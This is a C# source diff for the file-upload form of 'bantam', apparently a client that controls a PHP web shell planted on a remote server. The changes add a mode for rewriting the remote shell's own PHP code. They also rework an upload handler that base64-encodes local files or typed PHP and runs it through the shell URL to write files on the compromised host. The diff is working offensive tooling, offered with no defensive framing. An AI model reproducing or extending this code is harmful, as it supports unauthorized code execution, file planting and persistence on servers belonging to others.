@@ -9,12 +9,28 @@ namespace bantam.Forms
 {
     public partial class UploadFile : Form
     {
+        /// <summary>
+        /// 
+        /// </summary>
         public string LocalFileLocation { get; set; }
+
+        /// <summary>
+        /// //
+        /// </summary>
         public string ServerPath { get; set; }
+
+        /// <summary>
+        /// 
+        /// </summary>
         public string ShellUrl { get; set; }
 
         /// <summary>
         /// 
+        /// </summary>
+        public bool EditingSelf { get; set; }
+
+        /// <summary>
+        /// Normal Upload file constructor, sets full url to Shell, and Full path of upload directory
         /// </summary>
         /// <param name="shellUrl"></param>
         /// <param name="serverPath"></param>
@@ -24,6 +40,27 @@ namespace bantam.Forms
 
             ShellUrl = shellUrl;
             lblDynPath.Text = ServerPath = serverPath;
+        }
+
+        /// <summary>
+        /// Constructor for editing bantams self php code
+        /// </summary>
+        /// <param name="shellUrl"></param>
+        /// <param name="serverPath"></param>
+        public UploadFile(string shellUrl, string content, bool editingBantamPhpCode)
+        {
+            InitializeComponent();
+
+            ShellUrl = shellUrl;
+            richTextBox1.Text = content;
+
+            btnBrowse.Enabled = false;
+            txtBoxFileName.Enabled = false;
+
+            txtBoxFileName.Text = "Editing Bantam";
+            lblDynPath.Text = "WARNING - Editing bantam source code, be very careful....";
+
+            EditingSelf = true;
         }
 
         /// <summary>
@@ -88,37 +125,47 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private async void btnUpload_Click(object sender, EventArgs e)
         {
-            btnUpload.Enabled = false;
-            richTextBox1.Enabled = false;
-            btnBrowse.Enabled = false;
-
             string phpCode = string.Empty;
 
-            if (!string.IsNullOrEmpty(LocalFileLocation)) {
-                phpCode = Convert.ToBase64String(File.ReadAllBytes(LocalFileLocation));
-            } else if (!string.IsNullOrEmpty(richTextBox1.Text)) {
-                phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
+            btnBrowse.Enabled = false;
+            btnUpload.Enabled = false;
+            richTextBox1.Enabled = false;
+            
+            if (EditingSelf) {
+               if (!string.IsNullOrEmpty(richTextBox1.Text)) {
+                    phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
+                } else {
+                    //todo level 3 logging
+                    btnUpload.Enabled = true;
+                    return;
+                }
+
+                phpCode = PhpHelper.WriteFileVar(PhpHelper.phpServerScriptFileName, phpCode);
             } else {
-                //todo level 3 logging
-                btnUpload.Enabled = true;
-                return;
+                if (!string.IsNullOrEmpty(LocalFileLocation)) {
+                    phpCode = Convert.ToBase64String(File.ReadAllBytes(LocalFileLocation));
+                } else if (!string.IsNullOrEmpty(richTextBox1.Text)) {
+                    phpCode = Helper.EncodeBase64ToString(richTextBox1.Text);
+                } else {
+                    //todo level 3 logging
+                    btnUpload.Enabled = true;
+                    return;
+                }
+
+                //todo check file size and validate send mode and max send size..
+                //eventually todo chunking
+                string remoteFileLocation = ServerPath + "/" + txtBoxFileName.Text;
+                phpCode = PhpHelper.WriteFile(remoteFileLocation, phpCode);
             }
-
-            //todo check file size and validate send mode and max send size..
-            //eventually todo chunking
-            string remoteFileLocation = ServerPath + "/" + txtBoxFileName.Text;
-
-            phpCode = PhpHelper.WriteFile(remoteFileLocation, phpCode);
 
             await WebHelper.ExecuteRemotePHP(ShellUrl, phpCode, true);
 
             GC.Collect();
-
             this.Close();
 
             btnUpload.Enabled = true;
-            richTextBox1.Enabled = true;
             btnBrowse.Enabled = true;
+            richTextBox1.Enabled = true;
         }
 
         /// <summary>
@@ -133,6 +180,11 @@ namespace bantam.Forms
             } else {
                 btnUpload.Enabled = true;
             }
+        }
+
+        private void UploadFile_Load(object sender, EventArgs e)
+        {
+
         }
     }
 }
